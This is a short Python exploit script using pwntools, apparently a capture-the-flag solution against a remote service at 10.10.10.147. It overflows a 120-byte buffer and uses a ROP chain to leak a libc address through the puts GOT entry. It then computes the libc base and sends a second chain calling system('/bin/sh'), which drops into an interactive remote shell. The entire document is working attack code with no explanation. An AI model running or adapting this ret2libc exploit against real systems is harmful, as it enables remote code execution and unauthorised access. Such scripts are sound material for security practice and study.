#!/usr/bin/python3

from pwn import *

elf = ELF('./myapp')

#building ROP chain
#pop rdi; ret : 0x40120b
POP_RDI = 0x40120b
SYSTEM_PLT = elf.symbols["system"]
PUTS_GOT = elf.got["puts"]
MAIN_PLT = elf.symbols["main"]

log.info(f"System plt @ {hex(SYSTEM_PLT)}")
log.info(f"Puts got @ {hex(PUTS_GOT)}")
log.info(f"Main plt @ {hex(MAIN_PLT)}")

#generating payload
JUNK = b"A" * 120
payload = JUNK
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(SYSTEM_PLT)
payload += p64(MAIN_PLT)

p = remote('10.10.10.147', 1337)
p.recvline()
p.sendline(payload)
PUTS_LEAK = u64(p.recvline().strip()[7:-11].ljust(8, b"\x00"))
log.info(f"Leaked puts @ {hex(PUTS_LEAK)}")

libc_base = PUTS_LEAK - 0x68f90
log.info(f"Libc @ {hex(libc_base)}")

#generating payload 2
#/bin/sh offset 0x161c19
#exit funx offset 0x35980
BIN_SH = libc_base + 0x161c19
log.info(f"/bin/sh @ {hex(BIN_SH)}")

payload = JUNK
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(SYSTEM_PLT)

log.info("FINGERS CROSSED...")

p.recvline()
p.sendline(payload)
p.interactive()
